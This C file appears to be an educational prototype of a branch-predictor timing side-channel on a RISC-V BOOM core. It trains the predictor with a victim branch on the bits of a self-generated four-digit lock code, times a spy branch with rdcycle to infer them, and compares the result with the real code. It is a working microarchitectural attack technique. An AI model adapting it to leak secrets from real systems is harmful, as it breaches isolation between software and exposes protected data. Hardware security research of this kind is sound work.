// smart-lock.c
// Smart Lock timing attack prototype based on BRAD-v1-style branch training
// Target: BOOM core (or any core with dynamic branch prediction + rdcycle & fence)
// You must provide rlibsc.h with rdcycle() and fence().

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "rlibsc.h"

// ------------------------------------------------------------
// Configuration
// ------------------------------------------------------------

#define SECRET_LEN_DIGITS   4      // length of the lock code
#define BITS_PER_DIGIT      4      // enough to encode 0..9
#define TRAINING_RUNS       20     // branch predictor training per round
#define ATTACK_ROUNDS       400    // rounds per bit (increase for cleaner signal)

// ------------------------------------------------------------
// Global data
// ------------------------------------------------------------

// Secret lock code as digits 0..9
static uint8_t secret_digits[SECRET_LEN_DIGITS];

// Each digit expanded into 4 bits: secret_bits[digit_idx][bit_idx]
static uint8_t secret_bits[SECRET_LEN_DIGITS][BITS_PER_DIGIT];

// Spy control array: array1[0] -> branch false, array1[1] -> branch true
static volatile uint8_t array1[2] = {0, 1};

// Secret as string, to compare with user guess
static char secret_str[SECRET_LEN_DIGITS + 1];

// Inferred secret (from timings)
static uint8_t inferred_digits[SECRET_LEN_DIGITS];
static uint8_t inferred_bits[SECRET_LEN_DIGITS][BITS_PER_DIGIT];
static unsigned long last_avg0[SECRET_LEN_DIGITS][BITS_PER_DIGIT];
static unsigned long last_avg1[SECRET_LEN_DIGITS][BITS_PER_DIGIT];
static char inferred_str[SECRET_LEN_DIGITS + 1];

// ------------------------------------------------------------
// Secret data initialization
// ------------------------------------------------------------

static void init_secret_data(void)
{
    // Seed RNG with rdcycle so it changes per run
    srand((unsigned int)rdcycle());

    printf("Initializing secret smart-lock code...\n");

    for (int i = 0; i < SECRET_LEN_DIGITS; i++) {
        uint8_t d = (uint8_t)(rand() % 10);   // digit 0..9
        secret_digits[i] = d;

        // Build secret string for later comparison
        secret_str[i] = (char)('0' + d);

        // Expand into 4 bits (LSB first)
        secret_bits[i][0] = (d >> 0) & 1;
        secret_bits[i][1] = (d >> 1) & 1;
        secret_bits[i][2] = (d >> 2) & 1;
        secret_bits[i][3] = (d >> 3) & 1;
    }
    secret_str[SECRET_LEN_DIGITS] = '\0';

    // init inferred buffers
    memset(inferred_digits, 0, sizeof(inferred_digits));
    memset(inferred_bits, 0, sizeof(inferred_bits));
    memset(last_avg0, 0, sizeof(last_avg0));
    memset(last_avg1, 0, sizeof(last_avg1));
    memset(inferred_str, 0, sizeof(inferred_str));
}

// ------------------------------------------------------------
// Conditional branch gadget used by both victim and spy
// ------------------------------------------------------------

__attribute__((noinline))
static void condBranch(volatile uint8_t *addr)
{
    if (*addr) {
        // "Taken" path
        asm volatile("nop");
        asm volatile("nop");
    } else {
        // "Not taken" path
        asm volatile("addi t1, x0, 2");
    }
}

// Victim: branch outcome is controlled by secret_bits[digit_idx][bit_idx]
__attribute__((noinline))
static void victim_bit(int digit_idx, int bit_idx)
{
    condBranch(&secret_bits[digit_idx][bit_idx]);
}

// Spy: branch outcome is controlled by array1[bit_value] (0 or 1)
__attribute__((noinline))
static void spy_bit(uint8_t bit_value)
{
    condBranch(&array1[bit_value & 1]);
}

// ------------------------------------------------------------
// Attack: recover one digit (bit-by-bit)
// ------------------------------------------------------------

static uint8_t attack_digit(int digit_idx)
{
    printf("==================================================\n");
    printf("Attacking digit position %d\n", digit_idx);
    printf("Secret bit pattern is 4 bits (LSB→MSB). We will leak each bit.\n");

    uint8_t digit = 0;

    for (int bit_idx = 0; bit_idx < BITS_PER_DIGIT; bit_idx++) {
        unsigned long sum0 = 0;
        unsigned long sum1 = 0;

        for (int round = 0; round < ATTACK_ROUNDS; round++) {
            // 1) Train predictor with victim branch on this bit
            for (int t = 0; t < TRAINING_RUNS; t++) {
                victim_bit(digit_idx, bit_idx);
            }
            fence();

            // 2) Spy with bit_value = 0
            unsigned long before0 = (unsigned long)rdcycle();
            spy_bit(0);
            unsigned long after0  = (unsigned long)rdcycle();
            sum0 += (after0 - before0);

            fence();

            // 3) Spy with bit_value = 1
            unsigned long before1 = (unsigned long)rdcycle();
            spy_bit(1);
            unsigned long after1  = (unsigned long)rdcycle();
            sum1 += (after1 - before1);
        }

        unsigned long avg0 = sum0 / ATTACK_ROUNDS;
        unsigned long avg1 = sum1 / ATTACK_ROUNDS;

        // store last averages
        last_avg0[digit_idx][bit_idx] = avg0;
        last_avg1[digit_idx][bit_idx] = avg1;

        // inference rule: the "correct" outcome tends to be faster due to predictor state
        // (tweak if your measurements show the opposite)
        uint8_t inferred = (avg1 < avg0) ? 1 : 0;

        inferred_bits[digit_idx][bit_idx] = inferred;
        digit |= (inferred & 1u) << bit_idx;

        printf("  Bit %d: avg(spy(0))=%lu, avg(spy(1))=%lu\n",
               bit_idx, avg0, avg1);
    }

    inferred_digits[digit_idx] = digit;

    printf("==================================================\n");
    return digit; // raw 0..15 (since 4 bits)
}

static void build_inferred_string(void)
{
    for (int i = 0; i < SECRET_LEN_DIGITS; i++) {
        uint8_t d = inferred_digits[i];

        // Secret digits are 0..9. If inference produces 10..15, show '?'
        if (d <= 9) inferred_str[i] = (char)('0' + d);
        else        inferred_str[i] = '?';

        // Alternative mapping (if you prefer always-a-digit):
        // inferred_str[i] = (char)('0' + (d % 10));
    }
    inferred_str[SECRET_LEN_DIGITS] = '\0';
}

void wait(int seconds)
{
    // Simple wait loop (using rdcycle)
    size_t start = rdcycle();
    size_t freq = 100000000; // Assume 100 MHz for simplicity
    size_t wait_cycles = freq * (size_t)seconds;
    while ((rdcycle() - start) < wait_cycles) {
        // busy wait
    }
}

// ------------------------------------------------------------
// main
// ------------------------------------------------------------

int main(void)
{
    printf("Smart Lock timing attack test starting…\n");
    printf("SECRET_LEN_DIGITS=%d, BITS_PER_DIGIT=%d, ATTACK_ROUNDS=%d\n\n",
           SECRET_LEN_DIGITS, BITS_PER_DIGIT, ATTACK_ROUNDS);

    init_secret_data();

    // For each digit, leak its 4 bits and print timing statistics
    for (int i = 0; i < SECRET_LEN_DIGITS; i++) {
        (void)attack_digit(i);
    }

    // Build final inferred code string (but print it only once, near the end)
    build_inferred_string();

    printf("\nAll timing measurements completed.\n");
    printf("Now try to guess the %d-digit lock code based on the timings.\n", SECRET_LEN_DIGITS);

    wait(10);

    // SINGLE inference line before revealing actual
    printf("Inferred secret was: %s\n", inferred_str);
    printf("Actual secret was:   %s\n", secret_str);

    return 0;
}